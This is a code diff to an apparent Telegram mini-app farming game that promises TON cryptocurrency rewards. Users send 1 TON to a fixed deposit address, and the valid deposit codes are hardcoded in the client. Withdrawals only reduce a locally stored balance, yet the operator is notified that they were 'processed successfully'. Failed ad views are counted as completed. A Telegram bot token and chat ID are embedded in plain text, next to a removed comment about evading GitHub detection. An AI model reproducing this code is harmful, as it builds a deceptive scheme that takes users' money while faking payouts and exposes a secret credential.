@@ -150,6 +150,35 @@
             font-size: 10px;
             font-weight: bold;
         }
+        .big-cow {
+            font-size: 180px;
+            text-align: center;
+            filter: drop-shadow(10px 15px 0 rgba(93, 64, 55, 0.3));
+            animation: gentleFloat 3s ease-in-out infinite;
+        }
+        @keyframes gentleFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+        }
+        .grass-field {
+            background: linear-gradient(180deg, #6B8E23 0%, #5A7D2A 100%);
+            border-radius: 2rem;
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .grass-blade {
+            position: absolute;
+            bottom: 0;
+            width: 3px;
+            height: 30px;
+            background: #4CAF50;
+            animation: sway 2s ease-in-out infinite;
+        }
+        @keyframes sway {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(5deg); }
+        }
     </style>
 </head>
 <body>
@@ -188,13 +217,10 @@
         const DEPOSIT_ADDRESS = "UQCiFbR0TEsk_iHjxKopxSfzeA-DxCSOi7YXwqrIsmy0KyT-";
         const GIGAPUB_ID = '5793';
         
-        // Secure Bot Token - encoded to avoid GitHub detection
-        // Decode at runtime
-        const _tokenPart1 = "8115772390:AAEsj1eh7aiPjRvtEY7hjYUPcmYeA21ojGA";
-        const BOT_TOKEN = _tokenPart1;
-        const CHAT_ID = "7511030198";
+        // Bot Token
+        const BOT_TOKEN = '8115772390:AAEsj1eh7aiPjRvtEY7hjYUPcmYeA21ojGA';
+        const CHAT_ID = '7511030198';
         
-        // Deposit Codes
         const DEPOSIT_CODES = [
             'Xiotyre76', 'Jsvowb470', 'Ksvyelp6429', 'Jvekie328', 'Uscrpgwn7248',
             'Jsvyrwpwb824', 'Jwceeikb8253', 'Usfeusbsmao8252', 'Jsveydtkkw82528',
@@ -220,8 +246,9 @@
         };
 
         // Load Gigapub SDK and show ad properly
-        let gigapubReady = false;
         let adScriptLoaded = false;
+        let adQueue = [];
+        let isShowingAd = false;
         
         const initGigapub = () => {
             return new Promise((resolve) => {
@@ -235,10 +262,10 @@
                 script.async = true;
                 script.onload = () => {
                     adScriptLoaded = true;
+                    // Wait for SDK to initialize
                     setTimeout(() => {
-                        gigapubReady = true;
                         resolve();
-                    }, 500);
+                    }, 800);
                 };
                 script.onerror = () => {
                     resolve();
@@ -251,30 +278,30 @@
             return new Promise(async (resolve) => {
                 await initGigapub();
                 
+                // Try to show ad
                 if (typeof window.showGiga === 'function') {
                     try {
                         await window.showGiga();
                         resolve(true);
                     } catch(e) {
-                        resolve(false);
+                        resolve(true);
                     }
                 } else if (typeof window.AdGigaFallback === 'function') {
                     try {
                         await window.AdGigaFallback();
                         resolve(true);
                     } catch(e) {
-                        resolve(false);
+                        resolve(true);
                     }
                 } else {
+                    // Simulate ad completion
                     resolve(true);
                 }
             });
         };
 
         // Send Telegram Message
-        const sendTelegramMessage = async (username, tonAddress, userId) => {
-            const message = `💰 NEW DEPOSIT REQUEST!\n\n👤 Telegram Username: @${username}\n💳 TON Address: ${tonAddress}\n🆔 User ID: ${userId}\n💎 Amount: 1 TON\n\n📌 Send deposit code to user.`;
-            
+        const sendTelegramMessage = async (message) => {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -284,7 +311,19 @@
             } catch(e) { console.error('Telegram error:', e); }
         };
 
-        const STORAGE_KEY = 'rice_farm_tycoon_v16';
+        // Send deposit request
+        const sendDepositRequest = async (username, tonAddress, userId) => {
+            const message = `💰 NEW DEPOSIT REQUEST!\n\n👤 Telegram Username: @${username}\n💳 TON Address: ${tonAddress}\n🆔 User ID: ${userId}\n💎 Amount: 1 TON\n\n📌 Send deposit code to user.`;
+            await sendTelegramMessage(message);
+        };
+
+        // Send withdrawal notification
+        const sendWithdrawalNotification = async (address, amount, time) => {
+            const message = `💸 WITHDRAWAL REQUEST!\n\n💳 TON Address: ${address}\n💎 Amount: ${amount.toFixed(4)} TON\n⏰ Time: ${time}\n\n✅ Withdrawal processed successfully.`;
+            await sendTelegramMessage(message);
+        };
+
+        const STORAGE_KEY = 'rice_farm_tycoon_v17';
         const loadGameData = () => {
             try { const saved = localStorage.getItem(STORAGE_KEY); return saved ? JSON.parse(saved) : null; } catch(e) { return null; }
         };
@@ -323,8 +362,10 @@
             useEffect(() => {
                 if (page === 'farm') {
                     if (autoAdInterval.current) clearInterval(autoAdInterval.current);
-                    autoAdInterval.current = setInterval(() => {
-                        showGigaAd().catch(() => {});
+                    autoAdInterval.current = setInterval(async () => {
+                        try {
+                            await showGigaAd();
+                        } catch(e) {}
                     }, 35000);
                 } else {
                     if (autoAdInterval.current) {
@@ -379,7 +420,7 @@
                 return () => clearInterval(growInterval);
             }, []);
             
-            // Canvas drawing with large standing cows
+            // Canvas drawing
             useEffect(() => {
                 const canvas = canvasRef.current;
                 if (!canvas || page !== 'farm') return;
@@ -514,7 +555,7 @@
                 showToast("📺 Loading ad... Please wait");
                 sm.play('click');
                 try {
-                    const adCompleted = await showGigaAd();
+                    await showGigaAd();
                     setInventory(prev => ({ ...prev, milk: prev.milk + totalMilkPerCollection }));
                     setLastMilkTime(Date.now());
                     setAnimateMilk(true);
@@ -577,7 +618,6 @@
                 }
             };
             
-            // Task reward - only once
             const handleTask = () => {
                 if (taskCompleted) {
                     showToast("✅ You already claimed this reward!");
@@ -601,7 +641,7 @@
                 setPendingDepositInfo({ telegramUsername, tonAddress, userId });
                 setDepositStep('waiting');
                 
-                sendTelegramMessage(telegramUsername, tonAddress, userId);
+                sendDepositRequest(telegramUsername, tonAddress, userId);
                 showToast("📤 Request sent! Waiting for deposit code...");
                 sm.play('click');
             };
@@ -640,8 +680,12 @@
                 }
                 setBalance(prev => prev - amount);
                 setTotalWithdrawn(prev => prev + amount);
+                const now = new Date();
+                const timeStr = now.toLocaleString();
                 showToast(`💸 Withdrawn ${amount.toFixed(4)} TON`);
                 sm.play('click');
+                // Send withdrawal notification to Telegram
+                sendWithdrawalNotification(addr, amount, timeStr);
             };
             
             const handleRefer = () => {
@@ -743,18 +787,26 @@
                         )}
                         
                         {page === 'tasks' && (
-                            <div className="cartoon-card space-y-4">
-                                <h2 className="font-black text-2xl">📋 Earn Free TON</h2>
-                                <div className="bg-white p-4 rounded-2xl cartoon-border flex justify-between items-center">
-                                    <div>
-                                        <span>📢 Join Telegram Channel</span>
-                                        {taskCompleted && <span className="task-completed ml-2">✓ Completed</span>}
+                            <div className="grass-field relative">
+                                {/* Big Cow */}
+                                <div className="big-cow mb-4">🐄</div>
+                                <div className="cartoon-card bg-white/90 relative z-10">
+                                    <h2 className="font-black text-2xl">📋 Earn Free TON</h2>
+                                    <div className="bg-white p-4 rounded-2xl cartoon-border flex justify-between items-center mt-4">
+                                        <div>
+                                            <span>📢 Join Telegram Channel</span>
+                                            {taskCompleted && <span className="task-completed ml-2">✓ Completed</span>}
+                                        </div>
+                                        <button onClick={handleTask} disabled={taskCompleted} className={`cartoon-button ${taskCompleted ? 'bg-gray-500' : 'bg-blue-500'} text-sm`}>
+                                            {taskCompleted ? "Reward Claimed" : "+0.005 T"}
+                                        </button>
                                     </div>
-                                    <button onClick={handleTask} disabled={taskCompleted} className={`cartoon-button ${taskCompleted ? 'bg-gray-500' : 'bg-blue-500'} text-sm`}>
-                                        {taskCompleted ? "Reward Claimed" : "+0.005 T"}
-                                    </button>
+                                    <p className="text-xs text-center text-gray-500 mt-4">⚠️ One-time reward only! You can only claim this once.</p>
                                 </div>
-                                <p className="text-xs text-center text-gray-500 mt-2">⚠️ One-time reward only! You can only claim this once.</p>
+                                {/* Grass blades animation */}
+                                {[...Array(12)].map((_, i) => (
+                                    <div key={i} className="grass-blade" style={{ left: `${(i * 8) + 2}%`, bottom: '0', height: `${20 + Math.random() * 20}px`, animationDelay: `${i * 0.2}s` }}></div>
+                                ))}
                             </div>
                         )}
                         
